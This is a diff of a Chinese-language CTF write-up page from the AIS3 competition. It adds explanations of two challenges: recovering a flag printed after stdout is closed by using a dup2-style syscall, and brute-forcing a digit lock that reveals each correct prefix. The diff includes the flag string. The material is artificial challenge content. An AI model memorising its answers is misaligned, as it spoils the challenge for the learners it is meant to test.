 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
@@ -766,7 +912,11 @@ user <span style="color:#f92672">=</span> json<span style="color:#f92672">.</spa
     write(<span style="color:#ae81ff">1</span>, flag, flag_len);
     <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
 }
-</code></pre></div><p><code>AIS3{dupppppqqqqqub}</code></p>
+</code></pre></div><p><code>close(1)</code>之後再把Flag 印到 stdout，當然看不到。</p>
+<p>上網爬了一堆文之後找到<a href="https://stackoverflow.com/questions/9084099/re-opening-stdout-and-stdin-file-descriptors-after-closing-them/9084222">這篇</a></p>
+<p>發現File Descriptor居然可以透過特定的syscall複製一份?</p>
+<p>用<code>make_a_syscall(33, 2, 1, 0)</code>讓Flag從stderr跑出來：</p>
+<p><code>AIS3{dupppppqqqqqub}</code></p>
 <p>又學到了一個這輩子大概不會再用到的syscall</p>
 <hr>
 <h2 id="cat-slayer-fake">
@@ -775,6 +925,14 @@ user <span style="color:#f92672">=</span> json<span style="color:#f92672">.</spa
     <i class="fa fa-link" aria-hidden="true"></i>
   </a>
 </h2>
+<p>就是一個密碼鎖，好像有13位來著？每一位都是0-9</p>
+<p>因為每次輸入都能知道自己的密碼到目前為止正確還錯誤</p>
+<p>所以這個鎖是 <code>O(10*n)</code> 而不是 <code>O(10^n)</code></p>
+<p>然後因為這個鎖的界面是用ncurses之類的東東寫的而不是傳統的CLI</p>
+<p>我還真的不會寫pwntools自動化XD</p>
+<p>我記得好像是在解Reverse解到精神渙散的時候來按一按，當作腦部復健。</p>
+<p>忘記去紀錄Flag是什麼了，然後這題最後好像從Misc搬到Welcome這個奇妙的類別去了</p>
+<p>欸以後Welcome多出幾題阿，我會努力去解的。</p>
 <hr>
 <h1 id="結果與心得">
   結果與心得
@@ -822,23 +980,6 @@ user <span style="color:#f92672">=</span> json<span style="color:#f92672">.</spa
       </div>
 
       
-  <footer class="footer">
-    <section class="container">
-      
-      
-        ©
-        
-        2021
-         x2w 
-      
-      
-         · 
-        技術支援 <a href="https://gohugo.io/">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/">Coder</a>.
-      
-      
-    </section>
-  </footer>
-
 
     </main>
 
